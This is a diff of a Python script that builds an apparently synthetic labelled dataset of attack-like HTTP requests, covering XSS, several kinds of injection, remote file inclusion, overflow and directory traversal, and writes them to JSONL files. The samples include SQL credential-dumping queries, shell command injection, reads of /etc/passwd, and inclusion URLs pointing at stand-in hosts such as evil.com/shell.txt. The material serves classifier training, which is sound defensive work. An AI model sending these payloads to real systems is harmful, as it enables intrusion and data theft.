 Accept: text/html
@@ -1739,7 +1830,8 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 """,
     # SQL Injection con UNION
-    """192.168.1.11 GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1
+    """192.168.1.11
+GET /products?id=1 UNION SELECT username,password FROM users-- HTTP/1.1
 Host: shop.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1752,7 +1844,8 @@ Content-Length: 0
 """,
 
     # Command Injection con pipe
-    """10.0.0.6 POST /admin HTTP/1.1
+    """10.0.0.6
+POST /admin HTTP/1.1
 Host: adminsite.com
 User-Agent: curl/7.80.0
 Accept: text/html
@@ -1767,7 +1860,8 @@ action=ping|ls /var/www
 """,
 
     # LDAP Injection con filtro alternativo
-    """172.16.0.3 GET /auth?user=*)(objectClass=*) HTTP/1.1
+    """172.16.0.3
+GET /auth?user=*)(objectClass=*) HTTP/1.1
 Host: corp.com
 User-Agent: Wget/1.21.1
 Accept: text/html
@@ -1780,7 +1874,8 @@ Content-Length: 0
 """,
 
     # XPath Injection con doppio apice
-    """203.0.113.10 GET /xml?user=' or ''=' HTTP/1.1
+    """203.0.113.10
+GET /xml?user=' or ''=' HTTP/1.1
 Host: xmlsite.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1793,7 +1888,8 @@ Content-Length: 0
 """,
 
     # XML Injection con tag chiuso male
-    """192.168.100.21 POST /api/xml HTTP/1.1
+    """192.168.100.21
+POST /api/xml HTTP/1.1
 Host: iot2.local
 User-Agent: python-requests/2.28.0
 Accept: */*
@@ -1808,7 +1904,8 @@ Content-Length: 90
 """,
 
     # NoSQL Injection con $gt
-    """10.10.10.11 GET /user?age[$gt]=0 HTTP/1.1
+    """10.10.10.11
+GET /user?age[$gt]=0 HTTP/1.1
 Host: apisite.com
 User-Agent: PostmanRuntime/7.29.0
 Accept: application/json
@@ -1821,7 +1918,8 @@ Content-Length: 0
 """,
 
     # Shell Injection con backtick
-    """172.16.1.2 POST /run HTTP/1.1
+    """172.16.1.2
+POST /run HTTP/1.1
 Host: shellsite.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1836,7 +1934,8 @@ cmd=echo vulnerable && whoami
 """,
 
     # HTML Injection con tag script
-    """192.0.2.2 GET /profile?bio=<script>document.body.innerHTML='hacked'</script> HTTP/1.1
+    """192.0.2.2
+GET /profile?bio=<script>document.body.innerHTML='hacked'</script> HTTP/1.1
 Host: demo2.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1849,7 +1948,8 @@ Content-Length: 0
 """,
 
     # JavaScript Injection con onmouseover
-    """198.51.100.3 GET /search?q=<img src=x onmouseover=alert('js2')> HTTP/1.1
+    """198.51.100.3
+GET /search?q=<img src=x onmouseover=alert('js2')> HTTP/1.1
 Host: formsite2.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1862,7 +1962,8 @@ Content-Length: 0
 """,
 
     # PHP Injection con include
-    """203.0.113.10 GET /index.php?page=../../../../etc/passwd HTTP/1.1
+    """203.0.113.10
+GET /index.php?page=../../../../etc/passwd HTTP/1.1
 Host: submit2.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -1971,7 +2072,8 @@ Accept-Language: en-US,en;q=0.9
 Connection: keep-alive
 """,
     # Stringa molto lunga in parametro GET
-    """192.168.1.10 GET /login?user={} HTTP/1.1
+    """192.168.1.10
+GET /login?user={} HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -1984,7 +2086,8 @@ Content-Length: 0
 """.format("A"*5000),
 
     # Stringa molto lunga in header User-Agent
-    """10.0.0.5 GET / HTTP/1.1
+    """10.0.0.5
+GET / HTTP/1.1
 Host: testsite.com
 User-Agent: {}
 Accept: text/html
@@ -1997,7 +2100,8 @@ Content-Length: 0
 """.format("B"*4000),
 
     # Numeri molto grandi in parametro
-    """172.16.0.2 GET /calc?value={} HTTP/1.1
+    """172.16.0.2
+GET /calc?value={} HTTP/1.1
 Host: vulnerable.com
 User-Agent: Wget/1.20.3
 Accept: text/html
@@ -2010,7 +2114,8 @@ Content-Length: 0
 """.format("9"*2000),
 
     # Body POST con stringa lunga
-    """203.0.113.8 POST /upload HTTP/1.1
+    """203.0.113.8
+POST /upload HTTP/1.1
 Host: webmail.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -2025,7 +2130,8 @@ Content-Length: 6000
 """.format("C"*6000),
 
     # Parametro multiplo con stringa e numeri
-    """192.168.100.20 GET /home?data={}&id={} HTTP/1.1
+    """192.168.100.20
+GET /home?data={}&id={} HTTP/1.1
 Host: iotdevice.local
 User-Agent: python-requests/2.25.1
 Accept: */*
@@ -2038,7 +2144,8 @@ Content-Length: 0
 """.format("E"*3500, "1234567890"*200),
 
     # Header ripetuto
-    """10.10.10.10 GET /api?callback=overflow HTTP/1.1
+    """10.10.10.10
+GET /api?callback=overflow HTTP/1.1
 Host: apisite.com
 User-Agent: PostmanRuntime/7.26.8
 Accept: application/json
@@ -2052,7 +2159,8 @@ Content-Length: 0
 """,
 
     # Body POST con caratteri speciali
-    """172.16.1.1 POST /page HTTP/1.1
+    """172.16.1.1 
+POST /page HTTP/1.1
 Host: mysite.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -2067,7 +2175,8 @@ Content-Length: 5000
 """.format("@#$%^&*()"*500),
 
     # Parametro GET con caratteri binari codificati
-    """192.0.2.1 GET /test?val={} HTTP/1.1
+    """192.0.2.1 
+GET /test?val={} HTTP/1.1
 Host: demo.com
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml
@@ -2080,7 +2189,8 @@ Content-Length: 0
 """.format("".join(["%{:02x}".format(i%256) for i in range(2000)])),
 
     # Body POST con sequenza di numeri e lettere alternati
-    """198.51.100.2 POST /form HTTP/1.1
+    """198.51.100.2 
+POST /form HTTP/1.1
 Host: formsite.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -2095,7 +2205,8 @@ Content-Length: 4800
 """.format("".join(["{}A".format(i%10) for i in range(2400)])),
 
     # Parametro GET con stringa Unicode molto lunga
-    """203.0.113.9 GET /submit?query={} HTTP/1.1
+    """203.0.113.9
+GET /submit?query={} HTTP/1.1
 Host: submit.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -2316,7 +2427,8 @@ Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
 Accept-Language: en-US,en;q=0.9
 Connection: keep-alive
 """,
-    """192.168.1.10 GET /index.php?page=http://evil.com/shell.txt HTTP/1.1
+    """192.168.1.10
+GET /index.php?page=http://evil.com/shell.txt HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9
@@ -2327,7 +2439,8 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 """,
-    """10.0.0.5 GET /home.php?file=http://malicious.org/rfi.txt HTTP/1.1
+    """10.0.0.5
+GET /home.php?file=http://malicious.org/rfi.txt HTTP/1.1
 Host: testsite.com
 User-Agent: curl/7.68.0
 Accept: */*
@@ -2338,7 +2451,8 @@ Connection: close
 Content-Type: text/plain
 Content-Length: 0
 """,
-    """172.16.0.2 GET /view.php?inc=http://attacker.com/include.txt HTTP/1.1
+    """172.16.0.2
+GET /view.php?inc=http://attacker.com/include.txt HTTP/1.1
 Host: vulnerable.com
 User-Agent: Wget/1.20.3
 Accept: text/html
@@ -2349,7 +2463,8 @@ Connection: keep-alive
 Content-Type: application/json
 Content-Length: 0
 """,
-    """203.0.113.8 GET /main.php?module=http://bad.com/rfi.php HTTP/1.1
+    """203.0.113.8
+GET /main.php?module=http://bad.com/rfi.php HTTP/1.1
 Host: webmail.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -2360,7 +2475,8 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 """,
-    """192.168.100.20 GET /load.php?url=http://evilsite.com/evil.txt HTTP/1.1
+    """192.168.100.20
+GET /load.php?url=http://evilsite.com/evil.txt HTTP/1.1
 Host: iotdevice.local
 User-Agent: python-requests/2.25.1
 Accept: */*
@@ -2371,7 +2487,8 @@ Connection: close
 Content-Type: text/html
 Content-Length: 0
 """,
-    """10.10.10.10 GET /app.php?data=http://hacker.com/data.txt HTTP/1.1
+    """10.10.10.10
+GET /app.php?data=http://hacker.com/data.txt HTTP/1.1
 Host: apisite.com
 User-Agent: PostmanRuntime/7.26.8
 Accept: application/json
@@ -2382,7 +2499,8 @@ Connection: keep-alive
 Content-Type: application/json
 Content-Length: 0
 """,
-    """172.16.1.1 GET /content.php?path=http://malware.com/file.txt HTTP/1.1
+    """172.16.1.1
+GET /content.php?path=http://malware.com/file.txt HTTP/1.1
 Host: mysite.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -2393,7 +2511,8 @@ Connection: keep-alive
 Content-Type: text/html
 Content-Length: 0
 """,
-    """192.0.2.1 GET /show.php?doc=http://exploit.com/doc.txt HTTP/1.1
+    """192.0.2.1
+GET /show.php?doc=http://exploit.com/doc.txt HTTP/1.1
 Host: demo.com
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml
@@ -2404,7 +2523,8 @@ Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 """,
-    """198.51.100.2 GET /display.php?source=http://remote.com/source.txt HTTP/1.1
+    """198.51.100.2
+GET /display.php?source=http://remote.com/source.txt HTTP/1.1
 Host: formsite.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -2415,7 +2535,8 @@ Connection: keep-alive
 Content-Type: text/plain
 Content-Length: 0
 """,
-    """203.0.113.9 GET /fetch.php?template=http://injection.com/tmpl.txt HTTP/1.1
+    """203.0.113.9
+GET /fetch.php?template=http://injection.com/tmpl.txt HTTP/1.1
 Host: submit.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -2912,7 +3033,8 @@ Content-Length: 40
 
 website=javascript:alert('XSS')
 """,
-    """192.168.1.10 GET /search?q=<script>alert('xss1')</script> HTTP/1.1
+    """192.168.1.10
+GET /search?q=<script>alert('xss1')</script> HTTP/1.1
 Host: example.com
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9
@@ -2923,7 +3045,8 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 """,
-    """10.0.0.5 GET /profile?bio=<img src=x onerror=alert('xss2')> HTTP/1.1
+    """10.0.0.5
+GET /profile?bio=<img src=x onerror=alert('xss2')> HTTP/1.1
 Host: testsite.com
 User-Agent: curl/7.68.0
 Accept: */*
@@ -2934,7 +3057,8 @@ Connection: close
 Content-Type: text/plain
 Content-Length: 0
 """,
-    """172.16.0.2 GET /comment?msg=<svg/onload=alert('xss3')> HTTP/1.1
+    """172.16.0.2
+GET /comment?msg=<svg/onload=alert('xss3')> HTTP/1.1
 Host: vulnerable.com
 User-Agent: Wget/1.20.3
 Accept: text/html
@@ -2945,7 +3069,8 @@ Connection: keep-alive
 Content-Type: application/json
 Content-Length: 0
 """,
-    """203.0.113.8 GET /login?redirect=<iframe src=javascript:alert('xss4')> HTTP/1.1
+    """203.0.113.8
+GET /login?redirect=<iframe src=javascript:alert('xss4')> HTTP/1.1
 Host: webmail.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -2956,7 +3081,8 @@ Connection: keep-alive
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 """,
-    """192.168.100.20 GET /home?data=<body onload=alert('xss5')> HTTP/1.1
+    """192.168.100.20
+GET /home?data=<body onload=alert('xss5')> HTTP/1.1
 Host: iotdevice.local
 User-Agent: python-requests/2.25.1
 Accept: */*
@@ -2967,7 +3093,8 @@ Connection: close
 Content-Type: text/html
 Content-Length: 0
 """,
-    """10.10.10.10 GET /api?callback=<script>alert('xss6')</script> HTTP/1.1
+    """10.10.10.10
+GET /api?callback=<script>alert('xss6')</script> HTTP/1.1
 Host: apisite.com
 User-Agent: PostmanRuntime/7.26.8
 Accept: application/json
@@ -2978,7 +3105,8 @@ Connection: keep-alive
 Content-Type: application/json
 Content-Length: 0
 """,
-    """172.16.1.1 GET /page?input=<img src=x onerror=alert('xss7')> HTTP/1.1
+    """172.16.1.1
+GET /page?input=<img src=x onerror=alert('xss7')> HTTP/1.1
 Host: mysite.org
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -2989,7 +3117,8 @@ Connection: keep-alive
 Content-Type: text/html
 Content-Length: 0
 """,
-    """192.0.2.1 GET /test?val=<svg/onload=alert('xss8')> HTTP/1.1
+    """192.0.2.1
+GET /test?val=<svg/onload=alert('xss8')> HTTP/1.1
 Host: demo.com
 User-Agent: Mozilla/5.0
 Accept: text/html,application/xhtml+xml
@@ -3000,7 +3129,8 @@ Connection: close
 Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 """,
-    """198.51.100.2 GET /form?field=<iframe src=javascript:alert('xss9')> HTTP/1.1
+    """198.51.100.2
+GET /form?field=<iframe src=javascript:alert('xss9')> HTTP/1.1
 Host: formsite.com
 User-Agent: Mozilla/5.0
 Accept: */*
@@ -3011,7 +3141,8 @@ Connection: keep-alive
 Content-Type: text/plain
 Content-Length: 0
 """,
-    """203.0.113.9 GET /submit?query=<body onload=alert('xss10')> HTTP/1.1
+    """203.0.113.9 
+GET /submit?query=<body onload=alert('xss10')> HTTP/1.1
 Host: submit.com
 User-Agent: Mozilla/5.0
 Accept: text/html
@@ -3023,3 +3154,27 @@ Content-Type: application/x-www-form-urlencoded
 Content-Length: 0
 """
 ]
+
+import re
+import pandas as pd
+df = { "Adware": adware, "Scanner": scanner, "Spyware": spyware, "Trojan": trojan, "XSS": xss, "Remote-file-Inclusion": remotefileinclosure, "Overflow": overflow, "Injection": injection, "Info-Disclosure": infodisclosure, "Dir-Traversal": directorytraversal, "Code-execution": codeexecution, "CGI": cgi, "Ransomware": ransomware, "Botnet": botnet, "Backdoor": backdoor}
+labels = ["Adware", "Scanner", "Spyware", "Trojan", "XSS", "Remote-file-Inclusion", "Overflow", "Injection", "Info-Disclosure", "Dir-Traversal", "Code-execution", "CGI", "Ransomware", "Botnet", "Backdoor"]
+
+with open('ip_dataset.jsonl', 'w') as f:
+    for label in labels:
+        for pkt in df[label]:
+            lines = pkt.strip().splitlines()
+            if lines:
+                ip = lines[0].strip()
+                print(f'{{"text": "{ip}", "class": "{label}"}}')
+                
+                f.write(f'{{"text": "{ip}", "class": "{label}"}}\n')
+
+dfs = pd.DataFrame()
+rows = []
+for label in labels:
+    for pkt in df[label]:
+        pkt_clean = pkt.lstrip('\n')
+        rows.append({"text": pkt_clean, "class": label})
+dfs = pd.DataFrame(rows)
+dfs.to_json('packets_dataset.jsonl', orient='records', lines=True)
